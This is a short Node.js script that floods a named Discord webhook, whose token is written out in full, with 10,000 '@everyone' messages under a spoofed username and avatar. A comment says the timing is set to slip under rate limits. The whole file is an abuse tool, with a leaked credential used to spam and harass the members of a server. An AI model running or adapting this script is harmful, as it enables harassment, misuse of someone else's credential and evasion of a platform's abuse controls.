var request = require('request');
var headers = {
  "Content-Type": "application/json"
}

var options = {
  url: "https://discordapp.com/api/webhooks/445628373407105037/mrp3krDu4avfXtCqGD9mUf240Kd-TJJYcez_IVLWGcoPZUplTeQq-Q8VuEmSxvzhU6ji",
  method:  "POST",
  headers: headers,
  form: {"content": "@everyone baha was here lol",
         "username": "Baha#8185",
         "avatar_url": "http://prntscr.com/jhs9bv"}
}

var interval = 10 * 35; // setting interval at .35 seconds so we dont get ratelimited
for (var x = 0; x < 10000; x+=1) { // change '100' to howmany messages u wanna send
  setTimeout( function (x) {
    request(options, function(error, body){
      if (error) console.log("Webhook is invalid"); // if we cant connect webhook = invalid
    })
  }, interval * x, x);
}
